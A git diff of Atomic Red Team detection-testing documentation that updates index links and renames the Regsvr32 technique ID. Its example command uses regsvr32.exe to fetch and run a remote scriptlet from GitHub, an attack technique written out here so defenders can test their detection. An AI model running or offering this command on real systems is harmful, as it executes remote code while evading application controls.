@@ -29,22 +29,22 @@ execute all the Discovery phase items at once in a batch file, or run each phase
 Select one or more Atomic Tests that you plan to execute. A complete list, ATT&CK matrices, and platform-specific
 matrices linking to Atomic Tests can be found here:
 
-- [Complete list of Atomic Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md)
-- [Atomic Tests per the ATT&CK Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/matrix.md)
-- Windows [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-matrix.md)
-- macOS [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/macos-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/macos-matrix.md)
-- Linux [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-matrix.md)
+- [Complete list of Atomic Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md)
+- [Atomic Tests per the ATT&CK Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/matrix.md)
+- Windows [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/windows-matrix.md)
+- macOS [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/macos-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/macos-matrix.md)
+- Linux [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/linux-matrix.md)
 
 ## Execute Test
 
-In this example we will use Technique `T1117 "Regsvr32"` and Atomic Test `"Regsvr32 remote COM scriptlet execution"`. This particular 
+In this example we will use Technique `T1218.010 "Regsvr32"` and Atomic Test `"Regsvr32 remote COM scriptlet execution"`. This particular 
 test is fairly easy to exercise since the tool is on all Windows workstations by default.
 
-The details of this test, [which are located here](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution),
+The details of this test, [which are located here](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md#atomic-test-1---regsvr32-local-com-scriptlet-execution),
 describe how you can test your detection by simply running the below command:
 
 ```
-regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
 ```
 
 ## Collect Evidence
